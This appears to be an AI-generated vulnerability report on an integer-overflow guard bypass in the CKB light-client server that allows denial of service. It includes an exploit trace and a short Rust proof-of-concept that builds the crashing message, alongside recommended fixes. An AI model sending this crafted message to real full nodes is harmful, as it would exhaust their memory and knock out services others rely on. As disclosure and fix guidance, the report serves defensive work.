The key code is now fully visible. Let me trace the exact arithmetic.

### Title
Integer Overflow in `GET_LAST_STATE_PROOF_LIMIT` Guard Enables Unbounded `reorg_last_n_numbers` Allocation and `complete_headers` Exhaustion — (`util/light-client-protocol-server/src/components/get_last_state_proof.rs`)

---

### Summary

The guard intended to bound `last_n_blocks` in `GetLastStateProofProcess::execute()` contains an integer overflow that can be triggered by any unprivileged peer. With `last_n_blocks = u64::MAX` and exactly 2 difficulty entries, the guard expression wraps to 0 and passes. This allows the reorg path to allocate `(0..start_block_number)` block numbers and then call `complete_headers` for every block from genesis to the chain tip, causing massive memory allocation and DB/MMR exhaustion.

---

### Finding Description

**Step 1 — Guard overflow (line 201)**

```rust
if self.message.difficulties().len() + (last_n_blocks as usize) * 2
    > constant::GET_LAST_STATE_PROOF_LIMIT   // = 1000
``` [1](#0-0) [2](#0-1) 

In Rust release builds, integer arithmetic wraps silently. With `last_n_blocks = u64::MAX`:

- `u64::MAX as usize = usize::MAX` (64-bit)
- `usize::MAX * 2` wraps to `usize::MAX - 1` (still >> 1000 → guard fires for 0 or 1 difficulties)
- With `difficulties.len() = 2`: `2 + (usize::MAX - 1) = usize::MAX + 1` wraps to **0**
- `0 > 1000` → **FALSE** → guard passes

**Step 2 — Reorg path allocates `(0..start_block_number)` (line 245–246)**

```rust
let min_block_number = start_block_number - min(start_block_number, last_n_blocks);
(min_block_number..start_block_number).collect()
``` [3](#0-2) 

With `last_n_blocks = u64::MAX`: `min(S, u64::MAX) = S`, so `min_block_number = 0`. The Vec collects every block number from 0 to `start_block_number`. This allocation happens **before** the difficulties validation at line 252.

**Step 3 — `last_n_numbers` also unbounded (line 291–296)**

```rust
if last_block_number - start_block_number <= last_n_blocks  // always true when last_n_blocks = u64::MAX
``` [4](#0-3) 

With `start_block_number = last_block_number` (chain tip), `last_n_numbers` is empty, so the total `block_numbers` Vec equals `reorg_last_n_numbers` = all blocks from 0 to tip.

**Step 4 — `complete_headers` iterates every block number (lines 124–180)**

For each block number in `block_numbers`, `complete_headers` calls:
- `snapshot.get_ancestor(...)` — DB lookup
- `snapshot.get_block(...)` — DB lookup
- `snapshot.chain_root_mmr(*number - 1).get_root()` — MMR computation
- Builds and pushes a `packed::VerifiableHeader` to a growing `Vec` [5](#0-4) 

For CKB mainnet at ~12 million blocks, this allocates ~12M `VerifiableHeader` structs (each ~200+ bytes = **~2.4 GB**) and performs ~24M DB lookups plus ~12M MMR root computations per request.

**Step 5 — Difficulties check is satisfiable by the attacker**

The check at line 268–288 requires `difficulties[0] > total_difficulty_at(start_block_number - 1)`. The attacker sets `difficulties = [U256::MAX - 1, U256::MAX - 0]` (2 sorted values) and `difficulty_boundary = U256::MAX`. Since the actual chain total difficulty is far below `U256::MAX`, this check passes. [6](#0-5) 

---

### Impact Explanation

A single malicious peer can send one crafted `GetLastStateProof` message that causes the full node to:
1. Allocate several GB of `VerifiableHeader` data in a single request
2. Perform tens of millions of synchronous DB lookups and MMR computations

This exhausts RAM (OOM kill) and/or saturates I/O, crashing or hanging all light-client-serving full nodes. Multiple concurrent requests amplify the effect.

---

### Likelihood Explanation

The attack requires no privileges, no PoW, no keys, and no prior state. Any peer that can send a `LightClientMessage` can trigger it. The crafted message is trivially constructable: set `last_n_blocks = u64::MAX`, include exactly 2 large difficulty values, set `start_number` to the current tip, and use a mismatched `start_hash` to force the reorg branch.

---

### Recommendation

1. **Fix the overflow**: Use saturating arithmetic in the guard:
   ```rust
   if self.message.difficulties().len()
       .saturating_add((last_n_blocks as usize).saturating_mul(2))
       > constant::GET_LAST_STATE_PROOF_LIMIT
   ```
2. **Bound `last_n_blocks` independently**: Reject any `last_n_blocks` exceeding a hard cap (e.g., 500) before any further processing.
3. **Move the guard before all allocations**: Ensure `reorg_last_n_numbers` is never computed until `last_n_blocks` is validated.
4. **Cap `reorg_last_n_numbers` size**: Even in the reorg path, the number of returned block numbers should be bounded by `GET_LAST_STATE_PROOF_LIMIT`.

---

### Proof of Concept

```rust
// Craft the malicious message:
let tip_hash = /* fetch from server via GetLastState */;
let tip_number = /* fetch from server */;

let content = packed::GetLastStateProof::new_builder()
    .last_hash(tip_hash)
    .start_hash(Byte32::zero())          // wrong hash → forces reorg branch
    .start_number(tip_number.pack())     // start = tip → reorg covers 0..tip
    .last_n_blocks(u64::MAX.pack())      // triggers overflow
    .difficulty_boundary(U256::MAX.pack())
    .difficulties(
        // 2 entries → 2 + (usize::MAX - 1) wraps to 0, bypassing guard
        vec![U256::MAX - 2, U256::MAX - 1].pack()
    )
    .build();
// Send to any light-client-serving full node.
// Server allocates (tip_number * sizeof(VerifiableHeader)) bytes → OOM.
``` [7](#0-6)

### Citations

**File:** util/light-client-protocol-server/src/components/get_last_state_proof.rs (L130-172)
```rust
        let mut headers = Vec::new();

        for number in numbers {
            if let Some(ancestor_header) = self.snapshot.get_ancestor(last_hash, *number) {
                let position = leaf_index_to_pos(*number);
                positions.push(position);

                let ancestor_block = self
                    .snapshot
                    .get_block(&ancestor_header.hash())
                    .ok_or_else(|| {
                        format!(
                            "failed to find block for header#{} (hash: {:#x})",
                            number,
                            ancestor_header.hash()
                        )
                    })?;
                let uncles_hash = ancestor_block.calc_uncles_hash();
                let extension = ancestor_block.extension();

                let parent_chain_root = if *number == 0 {
                    Default::default()
                } else {
                    let mmr = self.snapshot.chain_root_mmr(*number - 1);
                    match mmr.get_root() {
                        Ok(root) => root,
                        Err(err) => {
                            let errmsg = format!(
                                "failed to generate a root for block#{number} since {err:?}"
                            );
                            return Err(errmsg);
                        }
                    }
                };

                let header = packed::VerifiableHeader::new_builder()
                    .header(ancestor_header.data())
                    .uncles_hash(uncles_hash)
                    .extension(Pack::pack(&extension))
                    .parent_chain_root(parent_chain_root)
                    .build();

                headers.push(header);
```

**File:** util/light-client-protocol-server/src/components/get_last_state_proof.rs (L198-247)
```rust
    pub(crate) async fn execute(self) -> Status {
        let last_n_blocks: u64 = self.message.last_n_blocks().into();

        if self.message.difficulties().len() + (last_n_blocks as usize) * 2
            > constant::GET_LAST_STATE_PROOF_LIMIT
        {
            return StatusCode::MalformedProtocolMessage.with_context("too many samples");
        }

        let snapshot = self.protocol.shared.snapshot();

        let last_block_hash = self.message.last_hash().to_entity();
        if !snapshot.is_main_chain(&last_block_hash) {
            return self
                .protocol
                .reply_tip_state::<packed::SendLastStateProof>(self.peer, self.nc)
                .await;
        }
        let last_block = snapshot
            .get_block(&last_block_hash)
            .expect("block should be in store");

        let start_block_hash = self.message.start_hash().to_entity();
        let start_block_number: BlockNumber = self.message.start_number().into();
        let difficulty_boundary: U256 = self.message.difficulty_boundary().into();
        let mut difficulties = self
            .message
            .difficulties()
            .iter()
            .map(Into::<U256>::into)
            .collect::<Vec<_>>();

        let last_block_number = last_block.number();
        if start_block_number > last_block_number {
            return StatusCode::InvalidRequest.with_context(format!(
                "the start block number ({start_block_number}) should not be greater than the last block number ({last_block_number})"
            ));
        }

        let reorg_last_n_numbers = if start_block_number == 0
            || snapshot
                .get_ancestor(&last_block_hash, start_block_number)
                .map(|header| header.hash() == start_block_hash)
                .unwrap_or(false)
        {
            Vec::new()
        } else {
            let min_block_number = start_block_number - min(start_block_number, last_n_blocks);
            (min_block_number..start_block_number).collect()
        };
```

**File:** util/light-client-protocol-server/src/components/get_last_state_proof.rs (L268-288)
```rust
            if let Some(start_difficulty) = difficulties.first()
                && start_block_number > 0
            {
                let previous_block_number = start_block_number - 1;
                if let Some(total_difficulty) =
                    sampler.get_block_total_difficulty(previous_block_number)
                {
                    if total_difficulty >= *start_difficulty {
                        let errmsg = format!(
                            "the start difficulty is {start_difficulty:#x} too less than \
                                the previous block #{previous_block_number} of the start block"
                        );
                        return StatusCode::InvalidRequest.with_context(errmsg);
                    }
                } else {
                    let errmsg = format!(
                        "the total difficulty for block#{previous_block_number} is not found"
                    );
                    return StatusCode::InternalError.with_context(errmsg);
                };
            }
```

**File:** util/light-client-protocol-server/src/components/get_last_state_proof.rs (L291-297)
```rust
        let (sampled_numbers, last_n_numbers) = if last_block_number - start_block_number
            <= last_n_blocks
        {
            // There is not enough blocks, so we take all of them; so there is no sampled blocks.
            let sampled_numbers = Vec::new();
            let last_n_numbers = (start_block_number..last_block_number).collect::<Vec<_>>();
            (sampled_numbers, last_n_numbers)
```

**File:** util/light-client-protocol-server/src/constant.rs (L6-6)
```rust
pub const GET_LAST_STATE_PROOF_LIMIT: usize = 1000;
```
